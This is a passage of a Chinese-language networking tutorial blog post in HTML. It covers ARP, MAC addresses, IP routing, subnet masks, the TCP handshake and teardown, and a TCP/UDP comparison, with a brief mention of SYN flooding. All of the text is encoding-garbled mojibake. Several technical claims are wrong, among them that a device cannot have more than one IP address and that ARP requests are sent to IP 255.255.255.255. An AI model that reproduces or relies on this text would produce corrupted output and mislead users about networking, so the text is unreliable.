åœ°å€ã€‚å½“æœ¬ç½‘ç»œçš„æ‰€æœ‰ä¸»æœºæ”¶åˆ°è¯¥ARPæ•°æ®åŒ…æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥æ•°æ®åŒ…ä¸­çš„IPåœ°å€æ˜¯å¦æ˜¯è‡ªå·±çš„IPåœ°å€ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™å¿½ç•¥è¯¥æ•°æ®åŒ…ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™é¦–å…ˆä»æ•°æ®åŒ…ä¸­å–å‡ºæºä¸»æœºçš„IPå’ŒMACåœ°å€å†™å…¥åˆ°ARPåˆ—è¡¨ä¸­ï¼Œå¦‚æœå·²ç»å­˜åœ¨ï¼Œåˆ™è¦†ç›–ï¼Œç„¶åå°†è‡ªå·±çš„MACåœ°å€å†™å…¥ARPå“åº”åŒ…ä¸­ï¼Œå‘Šè¯‰æºä¸»æœºè‡ªå·±æ˜¯å®ƒæƒ³è¦æ‰¾çš„MACåœ°å€ã€‚æºä¸»æœºæ”¶åˆ°ARPå“åº”åŒ…åã€‚å°†ç›®çš„ä¸»æœºçš„IPå’ŒMACåœ°å€å†™å…¥ARPåˆ—è¡¨ï¼Œå¹¶åˆ©ç”¨æ­¤ä¿¡æ¯å‘é€æ•°æ®ã€‚å¦‚æœæºä¸»æœºä¸€ç›´æ²¡æœ‰æ”¶åˆ°ARPå“åº”æ•°æ®åŒ…ï¼Œè¡¨ç¤ºARPæŸ¥è¯¢å¤±è´¥ã€‚<br>æ³¨æ„ï¼šå¹¿æ’­ï¼ˆ255.255.255.255ï¼‰å‘é€ARPè¯·æ±‚ï¼Œå•æ’­å‘é€ARPå“åº”</li></ul><hr><p>MACåœ°å€ï¼šMACåœ°å€ä¹Ÿå«ç‰©ç†åœ°å€ã€ç¡¬ä»¶åœ°å€ï¼Œç”±ç½‘ç»œè®¾å¤‡åˆ¶é€ å•†ç”Ÿäº§æ—¶çƒ§å½•åœ¨ç½‘å¡(Network lnterface Card)çš„EPROM(ä¸€ç§é—ªå­˜èŠ¯ç‰‡ï¼Œé€šå¸¸å¯ä»¥é€šè¿‡ç¨‹åºæ“¦å†™)ã€‚IPåœ°å€ä¸MACåœ°å€åœ¨è®¡ç®—æœºé‡Œéƒ½æ˜¯ä»¥äºŒè¿›åˆ¶è¡¨ç¤ºçš„ï¼ŒIPåœ°å€æ˜¯32ä½çš„ï¼Œè€ŒMACåœ°å€åˆ™æ˜¯48ä½çš„ã€‚MACåœ°å€çš„é•¿åº¦ä¸º48ä½(6ä¸ªå­—èŠ‚)ï¼Œé€šå¸¸è¡¨ç¤ºä¸º12ä¸ª16è¿›åˆ¶æ•°ï¼Œå¦‚ï¼š00-16-EA-AE-3C-40å°±æ˜¯ä¸€ä¸ªMACåœ°å€ï¼Œå…¶ä¸­å‰3ä¸ªå­—èŠ‚ï¼Œ16è¿›åˆ¶æ•°00-16-EAä»£è¡¨ç½‘ç»œç¡¬ä»¶åˆ¶é€ å•†çš„ç¼–å·ï¼Œå®ƒç”±IEEE(ç”µæ°”ä¸ç”µå­å·¥ç¨‹å¸ˆåä¼š)åˆ†é…ï¼Œè€Œå3ä¸ªå­—èŠ‚ï¼Œ16è¿›åˆ¶æ•°AE-3C-40ä»£è¡¨è¯¥åˆ¶é€ å•†æ‰€åˆ¶é€ çš„æŸä¸ªç½‘ç»œäº§å“(å¦‚ç½‘å¡)çš„ç³»åˆ—å·ã€‚åªè¦ä¸æ›´æ”¹è‡ªå·±çš„MACåœ°å€ï¼ŒMACåœ°å€åœ¨ä¸–ç•Œæ˜¯å”¯ä¸€çš„ã€‚å½¢è±¡åœ°è¯´ï¼ŒMACåœ°å€å°±å¦‚åŒèº«ä»½è¯ä¸Šçš„èº«ä»½è¯å·ç ï¼Œå…·æœ‰å”¯ä¸€æ€§ã€‚<br><em>éœ‡ç½‘ç—…æ¯’æ”»å‡»äº†è¥¿é—¨å­æ³„éœ²MACçš„PLC</em></p><hr><hr><h2 id="ç½‘ç»œä¹‹é—´ä¿¡æ¯ä¼ é€çš„åè®®ï¼ˆç½‘é™…å±‚ï¼‰"><a href="#ç½‘ç»œä¹‹é—´ä¿¡æ¯ä¼ é€çš„åè®®ï¼ˆç½‘é™…å±‚ï¼‰" class="headerlink" title="ç½‘ç»œä¹‹é—´ä¿¡æ¯ä¼ é€çš„åè®®ï¼ˆç½‘é™…å±‚ï¼‰"></a>ç½‘ç»œä¹‹é—´ä¿¡æ¯ä¼ é€çš„åè®®ï¼ˆç½‘é™…å±‚ï¼‰</h2><p><strong>IPåè®®ï¼š</strong> å°†IPä¿¡æ¯åŒ…ä»æºè®¾å¤‡(å¦‚ç”¨æˆ·çš„è®¡ç®—æœº)ä¼ åˆ°ç›®çš„è®¾å¤‡(å¦‚æŸéƒ¨é—¨çš„wwwæœåŠ¡å™¨)</p><ul><li><input checked="" disabled="" type="checkbox"> ä¸ºäº†è¾¾åˆ°è¿™æ ·çš„ç›®çš„ï¼ŒIPå¿…é¡»ä¾èµ–<strong>IPåœ°å€</strong>ä¸<strong>IPè·¯ç”±å™¨</strong>ä¸¤ç§æœºåˆ¶æ¥å®ç°ã€‚<br>IPåœ°å€<br>IPè§„å®šç½‘ç»œä¸Šæ‰€æœ‰çš„è®¾å¤‡éƒ½å¿…é¡»æœ‰ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„IPåœ°å€ï¼Œå°±å¥½æ¯”æ˜¯é‚®ä»¶ä¸Šéƒ½å¿…é¡»æ³¨æ˜æ”¶ä»¶äººåœ°å€ï¼Œé‚®é€’å‘˜æ‰èƒ½å°†é‚®ä»¶é€åˆ°ã€‚åŒç†ï¼Œæ¯ä¸ªIPä¿¡æ¯åŒ…éƒ½å¿…é¡»åŒ…å«æœ‰ç›®çš„è®¾å¤‡çš„IPåœ°å€ï¼Œä¿¡æ¯åŒ…æ‰å¯ä»¥æ­£ç¡®åœ°é€åˆ°ç›®çš„åœ°ã€‚åŒä¸€è®¾å¤‡ä¸å¯ä»¥æ‹¥æœ‰å¤šä¸ªIPåœ°å€ï¼Œæ‰€æœ‰ä½¿ç”¨IPçš„ç½‘ç»œè®¾å¤‡è‡³å°‘æœ‰ä¸€ä¸ªå”¯ä¸€çš„IPåœ°å€ã€‚<br>IPè·¯ç”±<br>äº’è”ç½‘æ˜¯ç”±è®¸å¤šä¸ªç½‘ç»œè¿æ¥æ‰€å½¢æˆçš„å¤§å‹ç½‘ç»œã€‚å¦‚æœè¦åœ¨äº’è”ç½‘ä¸­ä¼ é€IPä¿¡æ¯åŒ…ï¼Œé™¤äº†ç¡®ä¿ç½‘ç»œä¸Šæ¯ä¸ªè®¾å¤‡éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„IPåœ°å€ä¹‹å¤–ï¼Œç½‘ç»œä¹‹é—´è¿˜å¿…é¡»æœ‰ä¼ é€çš„æœºåˆ¶ï¼Œæ‰èƒ½å°†IPä¿¡æ¯åŒ…é€šè¿‡ä¸€ä¸ªä¸ªçš„ç½‘ç»œä¼ é€åˆ°ç›®çš„åœ°ã€‚æ­¤ç§ä¼ é€æœºåˆ¶ç§°ä¸ºIPè·¯ç”±ã€‚<br>å„ä¸ªç½‘ç»œé€šè¿‡è·¯ç”±å™¨ç›¸äº’è¿æ¥ã€‚è·¯ç”±å™¨çš„åŠŸèƒ½æ˜¯ä¸ºIPä¿¡æ¯åŒ…é€‰æ‹©ä¼ é€çš„è·¯å¾„ã€‚æ¢è¨€ä¹‹ï¼Œå¿…é¡»ä¾é æ²¿é€”å„è·¯ç”±å™¨çš„é€šåŠ›åˆä½œï¼Œæ‰èƒ½å°†IPä¿¡æ¯åŒ…é€åˆ°ç›®çš„åœ°ã€‚åœ¨IPè·¯ç”±çš„è¿‡ç¨‹ä¸­ï¼Œç”±è·¯ç”±å™¨è´Ÿè´£é€‰æ‹©è·¯å¾„ï¼ŒIPä¿¡æ¯åŒ…åˆ™æ˜¯è¢«ä¼ é€çš„å¯¹è±¡ã€‚<img src="https://img-blog.csdnimg.cn/2020120319503470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><hr><p>IPåœ°å€ä¸IPè·¯ç”±æ˜¯IPä¿¡æ¯åŒ…ä¼ é€çš„åŸºç¡€ã€‚æ­¤å¤–ï¼ŒIPä¿¡æ¯åŒ…ä¼ é€æ—¶è¿˜æœ‰ä¸€é¡¹å¾ˆé‡è¦çš„ç‰¹æ€§ï¼Œå³ä½¿ç”¨éè¿æ¥å¼çš„ä¼ é€æ–¹å¼ã€‚éè¿æ¥å¼çš„ä¼ é€æ–¹å¼æ˜¯æŒ‡IPä¿¡æ¯åŒ…ä¼ é€æ—¶ï¼Œæºè®¾å¤‡ä¸ç›®çš„è®¾å¤‡åŒæ–¹ä¸å¿…äº‹å…ˆè¿æ¥ï¼Œå³å¯å°†IPä¿¡æ¯åŒ…é€è¾¾ã€‚å³æºè®¾å¤‡å®Œå…¨ä¸ç”¨ç†ä¼šç›®çš„è®¾å¤‡ï¼Œè€Œåªæ˜¯å•çº¯åœ°å°†IPä¿¡æ¯åŒ…é€ä¸€é€å‡ºã€‚è‡³äºç›®çš„è®¾å¤‡æ˜¯å¦æ”¶åˆ°æ¯ä¸ªä¿¡æ¯åŒ…ã€æ˜¯å¦æ”¶åˆ°æ­£ç¡®çš„ä¿¡æ¯åŒ…ç­‰ï¼Œåˆ™ç”±ä¸Šå±‚çš„åè®®(ä¾‹å¦‚TCP)æ¥è´Ÿè´£æ£€æŸ¥ã€‚</p><hr><p>å­ç½‘æ©ç ï¼šç”¨æ¥æŒ‡æ˜ä¸€ä¸ªIPåœ°å€çš„å“ªäº›ä½æ ‡è¯†çš„æ˜¯ä¸»æœºæ‰€åœ¨çš„å­ç½‘ï¼Œä»¥åŠå“ªäº›ä½æ ‡è¯†çš„æ˜¯ä¸»æœºçš„ä½æ©ç ã€‚å­ç½‘æ©ç ä¸èƒ½å•ç‹¬å­˜åœ¨ï¼Œå®ƒå¿…é¡»ç»“åˆIPåœ°å€ä¸€èµ·ä½¿ç”¨ã€‚å­ç½‘æ©ç åªæœ‰ä¸€ä¸ªä½œç”¨ï¼Œå°±æ˜¯å°†æŸä¸ªIPåœ°å€åˆ’åˆ†æˆç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€ä¸¤éƒ¨åˆ†ã€‚ç”¨äºå±è”½IPåœ°å€çš„ä¸€éƒ¨åˆ†ä»¥åŒºåˆ«ç½‘ç»œæ ‡è¯†å’Œä¸»æœºæ ‡è¯†ï¼Œå¹¶è¯´æ˜è¯¥IPåœ°å€æ˜¯åœ¨å±€åŸŸç½‘ä¸Šï¼Œè¿˜æ˜¯åœ¨å¹¿åŸŸç½‘ä¸Šã€‚</p><hr><h2 id="ç½‘ç»œä¹‹é—´ä¿¡æ¯ä¼ é€çš„åè®®ï¼ˆä¼ è¾“å±‚ï¼‰"><a href="#ç½‘ç»œä¹‹é—´ä¿¡æ¯ä¼ é€çš„åè®®ï¼ˆä¼ è¾“å±‚ï¼‰" class="headerlink" title="ç½‘ç»œä¹‹é—´ä¿¡æ¯ä¼ é€çš„åè®®ï¼ˆä¼ è¾“å±‚ï¼‰"></a>ç½‘ç»œä¹‹é—´ä¿¡æ¯ä¼ é€çš„åè®®ï¼ˆä¼ è¾“å±‚ï¼‰</h2><p><strong>â‘ TCPåè®®ï¼š</strong> ä¸ºä¸å¯é çš„äº’è”ç½‘ç»œä¸Šæä¾›å¯é çš„ç«¯åˆ°ç«¯å­—èŠ‚æµ</p><ul><li><p><input checked="" disabled="" type="checkbox">  åº”ç”¨å±‚å‘TCPå±‚å‘é€ç”¨äºç½‘é—´ä¼ è¾“çš„ã€ç”¨8ä½å­—èŠ‚è¡¨ç¤ºçš„æ•°æ®æµï¼Œç„¶åTCPæŠŠæ•°æ®æµåˆ†åŒºæˆé€‚å½“é•¿åº¦çš„æŠ¥æ–‡æ®µï¼ˆé€šå¸¸å—è¯¥è®¡ç®—æœºè¿æ¥çš„ç½‘ç»œçš„æ•°æ®é“¾è·¯å±‚çš„æœ€å¤§ä¼ è¾“å•å…ƒï¼ˆMTUï¼‰çš„é™åˆ¶ï¼‰ã€‚ä¹‹åTCPæŠŠç»“æœåŒ…ä¼ ç»™IPå±‚ï¼Œç”±å®ƒæ¥é€šè¿‡ç½‘ç»œå°†åŒ…ä¼ é€ç»™æ¥æ”¶ç«¯å®ä½“çš„TCPå±‚ã€‚TCPä¸ºäº†ä¿è¯ä¸å‘ç”Ÿä¸¢åŒ…ï¼Œå°±ç»™æ¯ä¸ªåŒ…ä¸€ä¸ªåºå·ï¼ŒåŒæ—¶åºå·ä¹Ÿä¿è¯äº†ä¼ é€åˆ°æ¥æ”¶ç«¯å®ä½“çš„åŒ…çš„æŒ‰åºæ¥æ”¶ã€‚ç„¶åæ¥æ”¶ç«¯å®ä½“å¯¹å·²æˆåŠŸæ”¶åˆ°çš„åŒ…å‘å›ä¸€ä¸ªç›¸åº”çš„ç¡®è®¤ï¼ˆACKï¼‰ï¼›å¦‚æœå‘é€ç«¯å®ä½“åœ¨åˆç†çš„å¾€è¿”æ—¶å»¶ï¼ˆRTTï¼‰å†…æœªæ”¶åˆ°ç¡®è®¤ï¼Œé‚£ä¹ˆå¯¹åº”çš„æ•°æ®åŒ…å°±è¢«å‡è®¾ä¸ºå·²ä¸¢å¤±å°†ä¼šè¢«è¿›è¡Œé‡ä¼ ã€‚TCPç”¨ä¸€ä¸ªæ ¡éªŒå’Œå‡½æ•°æ¥æ£€éªŒæ•°æ®æ˜¯å¦æœ‰é”™è¯¯ï¼›åœ¨å‘é€å’Œæ¥æ”¶æ—¶éƒ½è¦è®¡ç®—æ ¡éªŒå’Œã€‚æ¯å°æ”¯æŒTCPçš„æœºå™¨éƒ½æœ‰ä¸€ä¸ªTCPä¼ è¾“å®ä½“ã€‚TCPå®ä½“å¯ä»¥æ˜¯ä¸€ä¸ªåº“è¿‡ç¨‹ã€ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹ï¼Œæˆ–è€…å†…æ ¸çš„ä¸€éƒ¨åˆ†ã€‚åœ¨æ‰€æœ‰è¿™äº›æƒ…å½¢ä¸‹ï¼Œå®ƒç®¡ç†TCPæµï¼Œä»¥åŠä¸IPå±‚ä¹‹é—´çš„æ¥å£ã€‚TCPä¼ è¾“å®ä½“æ¥å—æœ¬åœ°è¿›ç¨‹çš„ç”¨æˆ·æ•°æ®æµï¼Œå°†å®ƒä»¬åˆ†å‰²æˆä¸è¶…è¿‡64KBï¼ˆå®é™…ä¸Šå»æ‰IPå’ŒTCPå¤´ï¼Œé€šå¸¸ä¸è¶…è¿‡1460æ•°æ®å­—èŠ‚ï¼‰çš„åˆ†æ®µï¼Œæ¯ä¸ªåˆ†æ®µä»¥å•ç‹¬çš„IPæ•°æ®æŠ¥å½¢å¼å‘é€ã€‚å½“åŒ…å«TCPæ•°æ®çš„æ•°æ®æŠ¥åˆ°è¾¾ä¸€å°æœºå™¨æ—¶ï¼Œå®ƒä»¬è¢«é€’äº¤ç»™TCPä¼ è¾“å®ä½“ï¼ŒTCPä¼ è¾“å®ä½“é‡æ„å‡ºåŸå§‹çš„å­—èŠ‚æµã€‚ä¸ºç®€åŒ–èµ·è§ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™ä»…ä»…ç”¨â€œTCPâ€æ¥ä»£è¡¨TCPä¼ è¾“å®ä½“ï¼ˆä¸€æ®µè½¯ä»¶ï¼‰æˆ–è€…TCPåè®®ï¼ˆä¸€ç»„è§„åˆ™ï¼‰ã€‚ä¾‹å¦‚ï¼Œåœ¨â€œç”¨æˆ·å°†æ•°æ®äº¤ç»™TCPâ€è¿™å¥è¯ä¸­ï¼Œå¾ˆæ˜¾ç„¶è¿™é‡ŒæŒ‡çš„æ˜¯TCPä¼ è¾“å®ä½“ã€‚IPå±‚å¹¶ä¸ä¿è¯æ•°æ®æŠ¥ä¸€å®šè¢«æ­£ç¡®åœ°é€’äº¤åˆ°æ¥æ”¶æ–¹ï¼Œä¹Ÿä¸æŒ‡ç¤ºæ•°æ®æŠ¥çš„å‘é€é€Ÿåº¦æœ‰å¤šå¿«ã€‚æ­£æ˜¯TCPè´Ÿè´£æ—¢è¦è¶³å¤Ÿå¿«åœ°å‘é€æ•°æ®æŠ¥ï¼Œä»¥ä¾¿ä½¿ç”¨ç½‘ç»œå®¹é‡ï¼Œä½†åˆä¸èƒ½å¼•èµ·ç½‘ç»œæ‹¥å¡ï¼šè€Œä¸”ï¼ŒTCPè¶…æ—¶åï¼Œè¦é‡ä¼ æ²¡æœ‰é€’äº¤çš„æ•°æ®æŠ¥ã€‚å³ä½¿è¢«æ­£ç¡®é€’äº¤çš„æ•°æ®æŠ¥ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨é”™åºçš„é—®é¢˜ï¼Œè¿™ä¹Ÿæ˜¯TCPçš„è´£ä»»ï¼Œå®ƒå¿…é¡»æŠŠæ¥æ”¶åˆ°çš„æ•°æ®æŠ¥é‡æ–°è£…é…æˆæ­£ç¡®çš„é¡ºåºã€‚</p></li><li><p><strong>TCP</strong></p></li></ul><p>å»ºç«‹æ–¹å¼â€”â€”ä¸‰æ¬¡æ¡æ‰‹ï¼š<br>ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€synåŒ…(seq=x)åˆ°æœåŠ¡å™¨ï¼Œå¹¶è¿›å…¥SYN_SEND(å‘é€)çŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡å™¨ç¡®è®¤ï¼›<br>ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡å™¨æ”¶åˆ°synåŒ…ï¼Œå¿…é¡»ç¡®è®¤å®¢æˆ·çš„SYNï¼ˆack=x+1ï¼‰ï¼ŒåŒæ—¶è‡ªå·±ä¹Ÿå‘é€ä¸€ä¸ªSYNåŒ…ï¼ˆseq=yï¼‰ï¼Œå³SYN+ACKåŒ…ï¼Œæ­¤æ—¶æœåŠ¡å™¨è¿›å…¥SYN_RECVï¼ˆæ¥æ”¶ï¼‰çŠ¶æ€ï¼›<br>ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„SYNï¼‹ACKåŒ…ï¼Œå‘æœåŠ¡å™¨å‘é€ç¡®è®¤åŒ…ACK(ack=y+1)ï¼Œæ­¤åŒ…å‘é€å®Œæ¯•ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨è¿›å…¥ESTABLISHEDï¼ˆå·²å»ºç«‹ï¼‰çŠ¶æ€ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20201203221946406.gif"></p><p>è¿æ¥ç»ˆæ­¢â€”â€”å››æ¬¡æŒ¥æ‰‹ï¼š<br>ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼šä¸»åŠ¨å…³é—­æ–¹å‘é€ä¸€ä¸ªFINï¼Œç”¨æ¥å…³é—­ä¸»åŠ¨æ–¹åˆ°è¢«åŠ¨å…³é—­æ–¹çš„æ•°æ®ä¼ é€ï¼Œä¹Ÿå°±æ˜¯ä¸»åŠ¨å…³é—­æ–¹å‘Šè¯‰è¢«åŠ¨å…³é—­æ–¹ï¼šæˆ‘å·²ç»ä¸ ä¼šå†ç»™ä½ å‘æ•°æ®äº†(å½“ç„¶ï¼Œåœ¨finåŒ…ä¹‹å‰å‘é€å‡ºå»çš„æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°å¯¹åº”çš„ackç¡®è®¤æŠ¥æ–‡ï¼Œä¸»åŠ¨å…³é—­æ–¹ä¾ç„¶ä¼šé‡å‘è¿™äº›æ•°æ®)ï¼Œä½†æ˜¯ï¼Œæ­¤æ—¶ä¸»åŠ¨å…³é—­æ–¹è¿˜å¯ä»¥æ¥å—æ•°æ®ã€‚<br>ç¬¬äºŒæ¬¡æŒ¥æ‰‹ï¼šè¢«åŠ¨å…³é—­æ–¹æ”¶åˆ°FINåŒ…åï¼Œå‘é€ä¸€ä¸ªACKç»™å¯¹æ–¹ï¼Œç¡®è®¤åºå·ä¸ºæ”¶åˆ°åºå·+1ã€‚<br>ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼šè¢«åŠ¨å…³é—­æ–¹å‘é€ä¸€ä¸ªFINï¼Œç”¨æ¥å…³é—­è¢«åŠ¨å…³é—­æ–¹åˆ°ä¸»åŠ¨å…³é—­æ–¹çš„æ•°æ®ä¼ é€ï¼Œä¹Ÿå°±æ˜¯å‘Šè¯‰ä¸»åŠ¨å…³é—­æ–¹ï¼Œæˆ‘çš„æ•°æ®ä¹Ÿå‘é€å®Œäº†ï¼Œä¸ä¼šå†ç»™ä½ å‘æ•°æ®äº†ã€‚<br>ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼šä¸»åŠ¨å…³é—­æ–¹æ”¶åˆ°FINåï¼Œå‘é€ä¸€ä¸ªACKç»™è¢«åŠ¨å…³é—­æ–¹ï¼Œç¡®è®¤åºå·ä¸ºæ”¶åˆ°åºå·+1ï¼Œè‡³æ­¤ï¼Œå®Œæˆå››æ¬¡æŒ¥æ‰‹ã€‚</p><p>è¯´æ˜ï¼š<br>1ï¼‰SYNå’ŒACKæ˜¯æ ‡å¿—ä½ï¼ˆ0/1ï¼‰ï¼ˆACK=1è¡¨æ˜ackæœ‰æ•ˆï¼‰ï¼Œseqæ˜¯åºåˆ—å·ï¼Œackæ˜¯ç¡®è®¤å·ã€‚<br>2ï¼‰ç»™å¯¹æ–¹çš„ç¡®è®¤æ–¹å¼å°±æ˜¯æŠŠå¯¹æ–¹ä¼ æ¥çš„seq+1å¹¶èµ‹ç»™ackã€‚<br>3ï¼‰SYNæ”»å‡» ç”¨ä¼—å¤šä¼ªé€ ipåœ°å€å‘æœåŠ¡å™¨å‘é€SYN=1ï¼ˆè¯·æ±‚è¿æ¥ï¼‰ï¼Œè®©æœåŠ¡å™¨å¤„äºSYN-RCVDçŠ¶æ€ï¼Œä½†éƒ½æ— æ³•ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼ˆå› ä¸ºä¼ªé€ ipä¸å­˜åœ¨ï¼‰<br>4ï¼‰4æ¬¡æŒ¥æ‰‹ä¸­çš„FINå°±ç›¸å½“äºä¸‰æ¬¡æ¡æ‰‹ä¸­çš„SYNã€‚<br>5ï¼‰åºå·seqï¼Œç¡®è®¤åºå·ackï¼Œç¡®è®¤æ ‡å¿—ä½ACKä½œç”¨è¿˜æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯ç¡®è®¤ä½œç”¨ï¼ˆæŠŠseqåŠ ä¸Š1èµ‹ç»™ackï¼Œå¹¶æŠŠACKç½®1ï¼‰<br>6ï¼‰ä¸ºä»€ä¹ˆä¸€ä¸ª3æ¬¡1ä¸ª4æ¬¡ä¸ä¸€æ ·ï¼Ÿ<br>å› ä¸ºä¸¤ç«¯çš„æ•°æ®å¹¶ä¸æ˜¯åŒæ—¶å‘é€å®Œï¼Œæ‰€ä»¥ä¸¤ç«¯è°å‘é€å®Œæ•°æ®éƒ½éœ€è¦è‡ªå·±å‘Šè¯‰å¯¹æ–¹ä¸€æ¬¡ï¼Œå¹¶ä¸”å¯¹æ–¹ç¡®è®¤ä¸€æ¬¡ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20201203210440531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><hr><p>äº’è”ç½‘ç»œä¸å•ä¸ªç½‘ç»œæœ‰å¾ˆå¤§çš„ä¸åŒï¼Œå› ä¸ºäº’è”ç½‘ç»œçš„ä¸åŒéƒ¨åˆ†å¯èƒ½æœ‰æˆªç„¶ä¸åŒçš„æ‹“æ‰‘ç»“æ„ã€å¸¦å®½ã€å»¶è¿Ÿã€æ•°æ®åŒ…å¤§å°å’Œå…¶ä»–å‚æ•°ã€‚TCPçš„è®¾è®¡ç›®æ ‡æ˜¯èƒ½å¤ŸåŠ¨æ€åœ°é€‚åº”äº’è”ç½‘ç»œçš„è¿™äº›ç‰¹æ€§ï¼Œè€Œä¸”å…·å¤‡é¢å¯¹å„ç§æ•…éšœæ—¶çš„å¥å£®æ€§ã€‚ä¸åŒä¸»æœºçš„åº”ç”¨å±‚ä¹‹é—´ç»å¸¸éœ€è¦å¯é çš„ã€åƒç®¡é“ä¸€æ ·çš„è¿æ¥ï¼Œä½†æ˜¯IPå±‚ä¸æä¾›è¿™æ ·çš„æµæœºåˆ¶ï¼Œè€Œæ˜¯æä¾›ä¸å¯é çš„åŒ…äº¤æ¢ã€‚ç®€è€Œè¨€ä¹‹ï¼ŒTCPå¿…é¡»æä¾›å¯é æ€§çš„è‰¯å¥½æ€§èƒ½ï¼Œè¿™æ­£æ˜¯å¤§å¤šæ•°ç”¨æˆ·æ‰€æœŸæœ›çš„è€ŒIPåˆæ²¡æœ‰æä¾›çš„åŠŸèƒ½ã€‚</p><hr><p><strong>â‘¡UDPåè®®ï¼š</strong> ä¸ºåº”ç”¨ç¨‹åºæä¾›äº†æ— éœ€å»ºç«‹è¿æ¥å°±å¯ä»¥å‘é€å°è£…çš„ IP æ•°æ®åŒ…çš„æ–¹æ³•</p><ul><li><input checked="" disabled="" type="checkbox"> å¯¹åº”ç”¨ç¨‹åºäº¤ä¸‹æ¥çš„æŠ¥æ–‡ï¼Œåœ¨æ·»åŠ é¦–éƒ¨åå°±å‘ä¸‹äº¤ä»˜ç»™IPå±‚ã€‚æ—¢ä¸æ‹†åˆ†ï¼Œä¹Ÿä¸åˆå¹¶ï¼Œè€Œæ˜¯ä¿ç•™è¿™äº›æŠ¥æ–‡çš„è¾¹ç•Œ</li></ul><table><thead><tr><th align="left"></th><th align="center">UDP</th><th align="center">TCP</th></tr></thead><tbody><tr><td align="left">æ˜¯å¦è¿æ¥</td><td align="center">æ— è¿æ¥</td><td align="center">é¢å‘è¿æ¥</td></tr><tr><td align="left">æ˜¯å¦å¯é </td><td align="center">ä¸å¯é ä¼ è¾“ï¼Œä¸ä½¿ç”¨æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶</td><td align="center">å¯é ä¼ è¾“ï¼Œä½¿ç”¨æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶</td></tr><tr><td align="left">è¿æ¥å¯¹è±¡ä¸ªæ•°</td><td align="center">æ”¯æŒä¸€å¯¹ä¸€ï¼Œä¸€å¯¹å¤šï¼Œå¤šå¯¹ä¸€å’Œå¤šå¯¹å¤šçš„äº¤äº’é€šä¿¡</td><td align="center">åªèƒ½ä¸€å¯¹ä¸€é€šä¿¡</td></tr><tr><td align="left">ä¼ è¾“æ–¹å¼</td><td align="center">é¢å‘æŠ¥æ–‡</td><td align="center">é¢å‘å­—èŠ‚æµ</td></tr><tr><td align="left">é¦–éƒ¨å­—èŠ‚</td><td align="center">8å­—èŠ‚</td><td align="center">æœ€å°20ï¼Œæœ€å¤§60å­—èŠ‚</td></tr><tr><td align="left">åº”ç”¨ç¯å¢ƒ</td><td align="center">é€‚ç”¨äºå®æ—¶é€šä¿¡ï¼ˆIPç”µè¯ã€è§†é¢‘ä¼šè®®ã€ç›´æ’­ç­‰ï¼‰</td><td align="center">é€‚ç”¨äºè¦æ±‚å¯é ä¼ è¾“çš„åº”ç”¨ï¼ˆæ–‡ä»¶ä¼ è¾“ï¼‰</td></tr><tr><td align="left">ä¸‹å±‚åè®®</td><td align="center">TFTPã€SNMPã€NFSã€DNSã€BOOTP</td><td align="center">FTPã€Telnetã€SMTPã€POP3ã€HTTP</td></tr></tbody></table><ul><li>TCPå‘ä¸Šå±‚æä¾›é¢å‘è¿æ¥çš„å¯é æœåŠ¡ ï¼ŒUDPå‘ä¸Šå±‚æä¾›æ— è¿æ¥ä¸å¯é æœåŠ¡ã€‚</li><li> è™½ç„¶ UDP å¹¶æ²¡æœ‰ TCP ä¼ è¾“æ¥çš„å‡†ç¡®ï¼Œä½†æ˜¯ä¹Ÿèƒ½åœ¨å¾ˆå¤šå®æ—¶æ€§è¦æ±‚é«˜çš„åœ°æ–¹æœ‰æ‰€ä½œä¸º</li><li> å¯¹æ•°æ®å‡†ç¡®æ€§è¦æ±‚é«˜ï¼Œé€Ÿåº¦å¯ä»¥ç›¸å¯¹è¾ƒæ…¢çš„ï¼Œå¯ä»¥é€‰ç”¨TCPã€‚ä¸äº§ç”Ÿä»»ä½•é¢å¤–çš„æ•°æ®ï¼Œå³ä½¿çŸ¥é“æœ‰ç ´åçš„åŒ…ä¹Ÿä¸è¿›è¡Œé‡å‘ã€‚å½“å¼ºè°ƒä¼ è¾“æ€§èƒ½è€Œä¸æ˜¯ä¼ è¾“çš„å®Œæ•´æ€§æ—¶ï¼Œå¦‚ï¼šéŸ³é¢‘å’Œå¤šåª’ä½“åº”ç”¨ï¼ŒUDPæ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚åœ¨æ•°æ®ä¼ 